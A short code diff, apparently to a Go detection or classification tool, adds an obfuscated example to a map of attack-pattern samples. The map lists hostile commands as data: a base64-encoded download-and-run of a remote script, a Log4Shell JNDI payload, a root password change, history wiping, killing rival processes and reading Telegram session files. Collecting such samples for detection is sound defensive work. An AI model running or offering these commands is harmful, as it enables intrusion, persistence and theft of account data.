@@ -48,6 +48,7 @@ var patternExamples = map[string]string{
 	"account":        "echo root:Passw0rd | chpasswd",
 	"cover_tracks":   "history -c; unset HISTFILE",
 	"kill_rivals":    "pkill -9 kdevtmpfsi",
+	"obfuscation":    "echo d2dldCBodHRwOi8vMjAzLjAuMTEzLjkveC5zaA== | base64 -d | sh",
 	"recon":          "uname -a; cat /proc/cpuinfo | grep name | wc -l",
 	"data_theft":     "ls -la ~/.local/share/TelegramDesktop/tdata",
 	"log4shell":      "/?x=${jndi:ldap://203.0.113.9/a}",
